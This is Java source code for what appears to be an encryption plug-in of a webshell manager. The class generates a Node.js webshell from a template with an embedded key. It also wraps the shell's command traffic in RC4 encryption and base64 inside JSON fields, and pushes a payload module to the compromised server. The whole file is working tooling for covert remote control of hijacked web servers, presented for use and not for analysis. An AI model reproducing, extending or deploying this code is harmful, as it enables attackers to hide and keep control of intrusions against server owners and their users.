package shells.cryptions.nodejs;


import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;

import util.Log;
import util.RC4;
import util.functions;
import util.http.Http;

import java.io.InputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@CryptionAnnotation(Name = "NODEJS_RC4_BASE64", payloadName = "NodeJsDynamicPayload")
public class NodeJsRC4Base64 implements Cryption {
    private ShellEntity shell;
    private Http http;
    private RC4 decodeCipher;
    private RC4 encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String pass;
    private Pattern pattern = Pattern.compile("\"data\"\\s*:\\s*\"([^\"]+)\"");

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        this.shell.getHeaders().put("Content-Type", "application/json");
        try {
            this.encodeCipher = new RC4(this.key);
            this.decodeCipher = new RC4(this.key);
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception e) {
            Log.error(e);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            synchronized (this.encodeCipher) {
                return String.format("{\"data\":\"%s\"}", functions.base64EncodeToString(encodeCipher.crypt(data))).getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public byte[] decode(byte[] bytes) {
        String text = new String(bytes);
        Matcher matcher = pattern.matcher(text);

        if (matcher.find()) {
            String dataStr = matcher.group(1);
            byte[] data = functions.base64Decode(dataStr);
            synchronized (this.decodeCipher) {
                return decodeCipher.crypt(data);
            }
        }
        return new byte[0];
    }

    public boolean isSendRLData() {
        return false;
    }

    public boolean check() {
        return this.state;
    }

    public byte[] generate(String password, String secretKey) {
        String key = functions.md5(secretKey).substring(0, 16);
        InputStream fileInputStream = NodeJsRC4Base64.class.getResourceAsStream("assets/rc4-json.js");
        String template = new String(functions.readInputStreamAutoClose(fileInputStream));
        String code = template.replace("{secretKey}", key).replace("{payloadName}", String.format("g%s", functions.md5(secretKey).substring(3, 8)));
        return code.getBytes();
    }
}
